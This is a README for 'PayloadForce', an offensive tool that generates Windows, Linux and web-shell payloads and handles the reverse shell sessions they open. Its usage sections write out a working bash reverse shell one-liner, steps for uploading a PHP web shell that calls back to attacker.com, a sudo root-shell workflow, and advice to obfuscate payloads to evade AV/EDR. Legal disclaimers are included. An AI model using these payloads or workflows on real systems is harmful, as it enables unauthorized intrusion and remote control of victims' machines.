# PayloadForce - Professional Payload Generator & Executor

PayloadForce is a lightweight, focused tool for generating and executing real working payloads. It's designed as a focused alternative to Metasploit's payload generation capabilities.

## Features

✅ **Real Working Payloads**
- Windows reverse shells (CMD, PowerShell, Meterpreter)
- Linux reverse shells (bash, Python, Perl)
- Web shells (PHP, ASP.NET, JSP)
- One-liner payloads for quick exploitation

✅ **Multi-Handler Listener**
- Listen for incoming reverse shell connections
- Manage multiple simultaneous sessions
- Interactive shell interaction
- Session management (list, interact, kill)

✅ **Professional CLI Interface**
- Interactive payload generation
- Quick payload lookup and generation
- Payload saving to files
- Session management

## Installation

```bash
# Install dependencies
pip install -r requirements-payloadforce.txt

# Or install individual packages
pip install colorama pwntools paramiko impacket
```

## Quick Start

### 1. Start PayloadForce CLI

```bash
python3 payloadforce.py
```

### 2. Generate a Payload

#### Interactive Mode
```
payloadforce> generate
# Follow the prompts to select payload type, LHOST, and LPORT
```

#### Direct Generation
```
payloadforce> gen windows/shell/reverse_tcp
LHOST [0.0.0.0]: 192.168.1.100
LPORT [4444]: 4444
```

#### List Available Payloads
```
payloadforce> list
```

### 3. Start Listener

```
payloadforce> listen
# Listens on 0.0.0.0:4444 by default

# Or specify custom port
payloadforce> listen -p 5555
```

### 4. Interact with Sessions

```
payloadforce> sessions          # List all active sessions
payloadforce> interact 1        # Connect to session 1
[1] > whoami                    # Execute commands
[1] > exit                      # Exit session
```

## Available Payloads

### Windows
```
windows/shell/reverse_tcp       - PowerShell reverse shell
windows/meterpreter/reverse_tcp - Meterpreter shell (requires msfvenom)
```

### Linux
```
linux/x64/shell/reverse_tcp     - Bash reverse shell
linux/x86/meterpreter/reverse_tcp - Meterpreter (x86)
```

### Web Shells
```
web/php_shell                   - PHP web shell
web/aspx_shell                  - ASP.NET web shell
web/jsp_shell                   - JSP web shell
```

### One-Liners
```
oneliner/bash_reverse           - Bash one-liner (multiple variants)
oneliner/python_reverse         - Python one-liner
oneliner/perl_reverse           - Perl one-liner
```

## Workflow Example

```bash
# Terminal 1: Start listener
$ python3 payloadforce.py
payloadforce> listen -p 4444

# Terminal 2: Generate payload
$ python3 payloadforce.py
payloadforce> gen oneliner/bash_reverse
LHOST [0.0.0.0]: 192.168.1.100
LPORT [4444]: 4444

[+] Payload generated (ID: 1)
Payload Details:
  type: oneliner/bash_reverse
  lhost: 192.168.1.100
  lport: 4444
  primary: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

payloadforce> save 1 /tmp/reverse.sh

# Execute payload on target
$ bash /tmp/reverse.sh

# Terminal 1: Handle incoming connection
[+] New connection from 192.168.1.50:52345 (Session 1)
listener> interact 1
[1] > id
uid=1000(user) gid=1000(user) groups=1000(user)
[1] > whoami
user
[1] > exit
```

## Command Reference

### Payload Operations
```
list              - List all available payloads
generate          - Interactive payload generation
gen <type>        - Generate payload by type
info <type>       - Get info about payload
show <id>         - Show generated payload details
payloads          - List all generated payloads
save <id> <file>  - Save payload to file
delete <id>       - Delete generated payload
clear             - Clear all generated payloads
```

### Listener/Handler
```
listen            - Start listener on 0.0.0.0:4444
listen -p PORT    - Listen on specific port
sessions          - List active sessions
```

### Utilities
```
help              - Show help message
clear-screen      - Clear terminal
exit              - Exit program
```

## Real-World Usage

### 1. Web Shell Upload & Execution
```bash
payloadforce> gen web/php_shell
LHOST: attacker.com
LPORT: 4444
payloadforce> save 1 /tmp/shell.php

# Upload shell.php to target web server
# Access: http://target.com/shell.php?cmd=id
```

### 2. Linux Privilege Escalation
```bash
payloadforce> gen oneliner/bash_reverse
LHOST: 192.168.1.100
LPORT: 4444
payloadforce> save 1 /tmp/rev.sh

# On target (with sudo privilege):
$ sudo bash /tmp/rev.sh

payloadforce> listen
[+] Root shell obtained!
```

### 3. Windows Target Exploitation
```bash
payloadforce> gen windows/shell/reverse_tcp
LHOST: 192.168.1.100
LPORT: 4444
payloadforce> save 1 C:\payload.ps1

# Execute on Windows:
# powershell -nop -c "& {$payload from saved file}"

payloadforce> listen
[+] Shell connected
```

## Advanced Features

### Multiple Session Handling
```
listener> list           # Show all sessions
listener> interact 1     # Connect to session 1
listener> kill 2         # Kill session 2
listener> background     # Background current session
```

### Payload Management
```
payloadforce> payloads              # List all generated
payloadforce> show 1                # View payload 1
payloadforce> save 1 /path/to/file  # Save to file
payloadforce> delete 1              # Delete payload 1
```

## Important Notes

⚠️ **LEGAL & ETHICAL USAGE:**
- Only use for authorized penetration testing
- Get written permission before testing any system
- Respect all applicable laws and regulations
- Use in controlled lab environments for learning

⚠️ **SECURITY CONSIDERATIONS:**
- These payloads are detectable by modern AV/EDR
- For operational security, use encoding/obfuscation
- Meterpreter payloads require MSFvenom for generation
- Web shells should be removed after testing

## Troubleshooting

### "Connection refused" on listener
```bash
# Check port is open
netstat -tuln | grep 4444

# Try different port
payloadforce> listen -p 5555
```

### Payload doesn't execute
- Verify LHOST is reachable from target
- Check firewall rules on listener
- Ensure target OS matches payload type
- Test with one-liner payloads first

### Sessions drop frequently
- Check network stability
- Increase timeout values in source
- Use keep-alive mechanisms

## Next Steps

1. **Learn more payloads**: Study the payload generator source code
2. **Integrate with framework**: Combine with reconnaissance tools
3. **Add encoding**: Implement payload encoding/obfuscation
4. **Extend listeners**: Add support for DNS/HTTPS tunneling
5. **Automation**: Create deployment scripts

## Resources

- Metasploit Framework: https://www.metasploit.com/
- OWASP Web Shells: https://owasp.org/
- Pwntools Documentation: https://docs.pwntools.com/
- HackTricks - Reverse Shells: https://book.hacktricks.xyz/

## License

This tool is provided for authorized security testing only.

---

**PayloadForce v1.0** | For Authorized Penetration Testing Only
